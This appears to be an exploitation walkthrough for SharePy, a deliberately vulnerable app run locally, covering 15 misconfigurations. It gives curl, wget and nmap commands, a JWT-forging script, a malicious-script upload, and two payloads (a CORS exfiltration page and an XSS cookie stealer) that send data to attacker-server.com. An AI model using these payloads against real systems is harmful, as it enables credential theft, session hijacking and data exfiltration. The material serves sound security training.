# SharePy Exploitation Report

This report provides step-by-step instructions on how to expose and exploit each of the 15 vulnerabilities in the vulnerable version of the SharePy application.

## Prerequisites

Before beginning the exploitation process, ensure you have the following tools installed:
- curl
- nmap
- wget
- netcat (nc)
- Python with requests library
- Docker and Docker Compose

Start the vulnerable SharePy application:
```bash
cd sharepy
docker-compose up -d
```

## M1: Admin Password in Clear Text

**Exploitation Steps:**

1. Access the exposed `.env` file:
   ```bash
   curl http://localhost/.env
   ```
   Output:
   ```
   DATABASE_URL=postgresql://admin:admin123@postgres:5432/sharepy
   MINIO_ENDPOINT=minio:9000
   MINIO_ACCESS_KEY=minioadmin
   MINIO_SECRET_KEY=minioadmin
   JWT_SECRET=secret123
   ADMIN_PASSWORD=admin123
   ```

2. Access the source code to find additional hardcoded credentials:
   ```bash
   curl http://localhost:8000/docs  # View API documentation
   ```

3. Find the admin password in the source code by examining the main.py file:
   ```bash
   # In backend/main.py, lines 9-10:
   ADMIN_PASSWORD = "admin123"
   ADMIN_EMAIL = "admin@sharepy.local"
   ```

**Impact**: Full administrative access to the application and database, leading to complete system compromise.

## M2: Debug Mode Enabled

**Exploitation Steps:**

1. Trigger an error by accessing a non-existent endpoint:
   ```bash
   curl http://localhost:8000/nonexistent
   ```

2. Observe the detailed stack trace that reveals:
   - File paths on the server
   - Source code snippets
   - Internal application structure
   - Framework version information

**Impact**: Information disclosure that aids attackers in understanding the application architecture and identifying further vulnerabilities.

## M3: Directory Listing Enabled

**Exploitation Steps:**

1. Access the uploads directory:
   ```bash
   curl http://localhost/uploads/
   ```

2. View all uploaded files without authentication:
   ```bash
   curl http://localhost/uploads/sensitive_document.pdf
   ```

**Impact**: Unauthorized access to all uploaded files, violating user privacy and potentially exposing sensitive data.

## M4: Sensitive Files Accessible

**Exploitation Steps:**

1. Access the .env file:
   ```bash
   curl http://localhost/.env
   ```

2. Access the .git directory:
   ```bash
   curl http://localhost/.git/config
   curl http://localhost/.git/HEAD
   ```

3. Download the entire git repository:
   ```bash
   wget -r http://localhost/.git/
   ```

4. Look for backup files:
   ```bash
   curl http://localhost/backup.db
   curl http://localhost/config.py.bak
   ```

**Impact**: Source code disclosure, credential theft, and exposure of development history.

## M5: pgAdmin/Adminer Publicly Accessible

**Exploitation Steps:**

1. Access Adminer:
   ```bash
   firefox http://localhost:8080
   ```

2. Connect to PostgreSQL directly using credentials found in .env:
   - Server: postgres
   - Username: admin
   - Password: admin123
   - Database: sharepy

3. Perform database operations:
   - View all users and their data
   - Modify or delete records
   - Extract sensitive information
   - Drop tables

**Impact**: Full database compromise and unauthorized data manipulation.

## M6: MinIO Public Bucket + Keys in Code

**Exploitation Steps:**

1. Install MinIO client:
   ```bash
   wget https://dl.min.io/client/mc/release/linux-amd64/mc
   chmod +x mc
   ```

2. Configure with leaked credentials:
   ```bash
   ./mc alias set myminio http://localhost:9000 minioadmin minioadmin
   ```

3. List all buckets:
   ```bash
   ./mc ls myminio
   ```

4. Download all files:
   ```bash
   ./mc mirror myminio/sharepy ./stolen_files/
   ```

**Impact**: Complete theft of all uploaded files from the application.

## M7: CORS Wildcard

**Exploitation Steps:**

1. Create a malicious webpage (evil.html):
   ```html
   <!DOCTYPE html>
   <html>
   <head><title>Malicious Page</title></head>
   <body>
   <script>
   fetch('http://localhost:8000/debug/info', {
       credentials: 'include'
   })
   .then(r => r.json())
   .then(data => {
       // Exfiltrate to attacker server
       fetch('http://attacker-server.com/collect', {
           method: 'POST',
           body: JSON.stringify(data)
       });
   });
   </script>
   </body>
   </html>
   ```

2. Serve the malicious page:
   ```bash
   python3 -m http.server 8001
   ```

3. Trick a victim into visiting the malicious page while logged into SharePy.

4. The victim's browser will automatically send the request with credentials due to CORS misconfiguration.

**Impact**: Cross-site request forgery (CSRF) and data exfiltration attacks.

## M8: No Security Headers

**Exploitation Steps:**

1. Check missing headers:
   ```bash
   curl -I http://localhost
   ```

2. Observe missing security headers:
   - Strict-Transport-Security (HSTS)
   - Content-Security-Policy (CSP)
   - X-Content-Type-Options
   - X-Frame-Options
   - X-XSS-Protection

3. Exploit the missing protections:
   - Perform clickjacking attacks
   - Execute XSS payloads more easily
   - Conduct man-in-the-middle attacks
   - Launch content sniffing attacks

**Impact**: Enables multiple attack vectors that would otherwise be mitigated by proper security headers.

## M9: Insecure Cookies

**Exploitation Steps:**

1. Log in to the application:
   ```bash
   curl -X POST http://localhost:8000/login -d "email=test@test.com&password=test" -v
   ```

2. Inspect cookies in the response:
   ```
   Set-Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
   ```

3. Observe missing cookie attributes:
   - No Secure flag (can be stolen over HTTP)
   - No HttpOnly flag (accessible via JavaScript)
   - No SameSite flag (CSRF possible)

4. Steal cookie via XSS:
   ```html
   <script>
   fetch('http://attacker-server.com/?cookie=' + document.cookie);
   </script>
   ```

**Impact**: Session hijacking and XSS-based credential theft.

## M10: Default FastAPI/Uvicorn Banner

**Exploitation Steps:**

1. Check server header:
   ```bash
   curl -I http://localhost:8000
   ```

2. Response shows:
   ```
   Server: uvicorn/0.24.0
   ```

3. Search for known vulnerabilities:
   ```bash
   # Research uvicorn 0.24.0 vulnerabilities online
   ```

**Impact**: Version disclosure enables targeted exploits against known vulnerabilities.

## M11: Verbose Nginx Errors

**Exploitation Steps:**

1. Trigger a 404 error:
   ```bash
   curl http://localhost/nonexistent/path/to/file
   ```

2. Error message reveals:
   - Full filesystem path: `/usr/share/nginx/html/nonexistent/path/to/file`
   - Nginx version
   - Internal directory structure

**Impact**: Information disclosure that aids in path traversal and other attacks.

## M12: Internal Ports Exposed

**Exploitation Steps:**

1. Scan exposed ports:
   ```bash
   nmap -p- localhost
   ```
   Output shows ports 5432, 8000, 8080, 9000, 9001 are open.

2. Direct PostgreSQL access:
   ```bash
   # If postgresql-client is installed
   psql -h localhost -p 5432 -U admin -d sharepy
   # Password: admin123
   ```

3. Direct MinIO access:
   ```bash
   curl http://localhost:9000
   ```

**Impact**: Direct access to internal services, bypassing application-layer security controls.

## M13: chmod 777 on Uploads

**Exploitation Steps:**

1. Check permissions (requires container access):
   ```bash
   docker exec -it sharepy-backend-1 ls -la /app/uploads
   ```
   Output shows: `drwxrwxrwx ... uploads/`

2. Upload a malicious script:
   ```bash
   # Create a simple shell script
   echo '#!/bin/bash\necho "Malicious code executed"' > malicious.sh
   curl -F "file=@malicious.sh" http://localhost:8000/upload
   ```

3. Execute it (if web server runs it):
   ```bash
   curl http://localhost/uploads/malicious.sh
   ```

**Impact**: Arbitrary file write/execute capabilities and potential privilege escalation.

## M14: /debug/info Endpoint

**Exploitation Steps:**

1. Access debug endpoint:
   ```bash
   curl http://localhost:8000/debug/info
   ```

2. Receive complete environment information:
   ```json
   {
     "env": {
       "DATABASE_URL": "postgresql://admin:admin123@postgres:5432/sharepy",
       "JWT_SECRET": "secret123",
       "MINIO_ACCESS_KEY": "minioadmin",
       "MINIO_SECRET_KEY": "minioadmin",
       "...": "..."
     },
     "cwd": "/app",
     "files": ["main.py", ".env", "uploads", "..."]
   }
   ```

**Impact**: Complete environment disclosure including all secrets and credentials.

## M15: Weak JWT Secret

**Exploitation Steps:**

1. Capture a JWT token from a legitimate user session.

2. Brute force the weak secret using a wordlist:
   ```bash
   # Using Python script or tool like jwt_tool.py
   python3 -c "
   import jwt
   token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...'  # captured token
   # Try common weak passwords
   weak_secrets = ['secret', 'secret123', 'admin', 'password', '123456']
   for secret in weak_secrets:
       try:
           decoded = jwt.decode(token, secret, algorithms=['HS256'])
           print(f'Success! Secret: {secret}')
           print(f'Decoded: {decoded}')
           break
       except jwt.InvalidSignatureError:
           continue
   "
   ```

3. Forge a new token with admin privileges:
   ```python
   import jwt
   forged_token = jwt.encode({'email': 'admin@sharepy.local', 'role': 'admin'}, 'secret123', algorithm='HS256')
   print(forged_token)
   ```

4. Use forged token to access admin endpoints:
   ```bash
   curl -H "Authorization: Bearer $FORGED_TOKEN" http://localhost:8000/admin
   ```

**Impact**: Authentication bypass and privilege escalation to administrative access.